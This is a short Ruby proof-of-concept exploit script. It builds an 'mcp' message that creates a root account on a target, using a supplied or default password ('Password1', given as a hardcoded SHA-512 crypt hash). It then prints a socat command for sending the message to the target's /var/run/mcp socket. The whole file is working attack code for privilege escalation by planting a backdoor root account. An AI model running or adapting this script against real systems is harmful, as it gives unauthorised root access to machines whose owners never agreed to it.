require './mcp-builder.rb'

USERNAME = ARGV[0] || 'rontest'

# "Password1"
if ARGV[1]
  if ARGV[1] =~ /^\$[0-9]\$/
    PASSWORD = ARGV[1]
  else
    $stderr.puts "Attempting to create a crypt-sha512 hash of the password"

    # This isn't a great way to generate salt, but works for our purposes!
    SALT = (0...8).map { (0x61 + rand(26)).chr }.join
    PASSWORD = ARGV[1].crypt("$6$#{ SALT }")
  end
else
  $stderr.puts "(Using default password: `Password1`)"
  $stderr.puts
  PASSWORD = '$6$T2mT4PeYSuyg/hSr$y/rN9tol5t1fRxTBqFVtxLzRfUBXt16yNahqYTaVVZa3PITfoAKBnuzqvwBT77qNBV4JjgwdhzqmsMk78bo6d0'
end

$stderr.puts("Writing an `mcp` message to stdout that'll create an account: #{ USERNAME } / #{ PASSWORD }")
$stderr.puts("Send it to the target using: socat -t100 - UNIX-CONNECT:/var/run/mcp < mcpmessage.bin")
$stderr.puts

create_root_account_plz(USERNAME, PASSWORD)
